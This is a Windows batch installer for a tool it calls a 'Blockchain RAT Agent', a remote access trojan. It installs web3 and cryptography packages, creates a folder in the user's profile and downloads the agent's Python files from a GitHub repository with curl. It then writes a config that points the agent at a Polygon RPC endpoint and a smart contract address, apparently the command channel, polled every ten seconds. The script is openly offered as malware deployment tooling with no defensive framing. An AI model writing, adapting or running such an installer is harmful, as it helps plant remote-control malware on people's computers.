@echo off
REM Blockchain RAT Agent - Simple Installer
REM This script downloads and installs the agent

echo ================================================
echo Blockchain RAT Agent Installer
echo ================================================
echo.

REM Check Python version
python --version 2>nul | findstr /C:"3.11" >nul
if errorlevel 1 (
    echo WARNING: Python 3.11 is recommended
    echo Current version:
    python --version
    echo.
    echo Download Python 3.11: https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe
    echo.
    pause
)

REM Install dependencies
echo [1/4] Installing dependencies...
python -m pip install --quiet web3==6.11.3 eth-account==0.10.0 cryptography==41.0.7 pycryptodome==3.19.0
if errorlevel 1 (
    echo ERROR: Failed to install dependencies
    pause
    exit /b 1
)
echo [OK] Dependencies installed
echo.

REM Create agent directory
echo [2/4] Creating agent directory...
if not exist "%USERPROFILE%\BlockchainRAT" mkdir "%USERPROFILE%\BlockchainRAT"
cd /d "%USERPROFILE%\BlockchainRAT"
echo [OK] Directory created: %USERPROFILE%\BlockchainRAT
echo.

REM Download agent files from GitHub
echo [3/4] Downloading agent files...
curl -L -o agent.py https://raw.githubusercontent.com/workspacehome0/blockchain_rat/main/agent/agent.py
curl -L -o encryption.py https://raw.githubusercontent.com/workspacehome0/blockchain_rat/main/shared/encryption.py
curl -L -o blockchain_client.py https://raw.githubusercontent.com/workspacehome0/blockchain_rat/main/shared/blockchain_client.py
curl -L -o SessionManager.abi.json https://raw.githubusercontent.com/workspacehome0/blockchain_rat/main/shared/SessionManager.abi.json

if not exist agent.py (
    echo ERROR: Failed to download files
    echo Check internet connection
    pause
    exit /b 1
)
echo [OK] Files downloaded
echo.

REM Create shared directory and move files
mkdir shared 2>nul
move encryption.py shared\ >nul 2>&1
move blockchain_client.py shared\ >nul 2>&1
move SessionManager.abi.json shared\ >nul 2>&1

REM Create config file
echo [4/4] Creating configuration...
(
echo {
echo   "rpc_url": "https://polygon-rpc.com",
echo   "contract_address": "0x5031fB08D66ea1181eaE1d89f6E960a4f26c3280",
echo   "private_key": "REPLACE_WITH_AGENT_PRIVATE_KEY",
echo   "poll_interval": 10
echo }
) > agent_config.json

echo [OK] Configuration created
echo.

echo ================================================
echo Installation Complete!
echo ================================================
echo.
echo Location: %USERPROFILE%\BlockchainRAT
echo.
echo IMPORTANT: Edit agent_config.json and set your private key!
echo.
echo Then run:
echo   python agent.py --register --config agent_config.json
echo   python agent.py --session SESSION_ID --config agent_config.json
echo.
pause

